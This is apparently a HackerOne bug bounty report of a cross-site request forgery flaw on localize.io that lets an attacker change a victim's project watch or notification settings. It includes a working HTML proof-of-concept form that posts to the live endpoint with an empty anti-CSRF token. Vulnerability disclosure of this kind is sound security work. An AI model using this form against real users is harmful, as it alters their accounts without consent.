# HackerOne Report: Projects Watch or Notifications Settings Change Via CSRF
**Report ID:** 8273
**Vulnerability Class:** Cross-Site Request Forgery (CSRF)

## Vulnerability Information & PoC
Hi Team,

I have found a CSRF vulnerability using which the attacker can force the victim to chnage the settings for Projects Watch or Notifications Via CSRF as the anti-csrf token is not getting validated on the server-side.

Projects Watch or Notifications Settings Change Via CSRF Code:

<html>
  <body>
    <form action="http://www.localize.io/watch/9s" method="POST">
      <input type="hidden" name="CSRFToken" value="" />
      <input type="hidden" name="watch[events][1]" value="0" />
      <input type="hidden" name="watch[events][2]" value="0" />
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>


## Discussion & Remediation Timeline
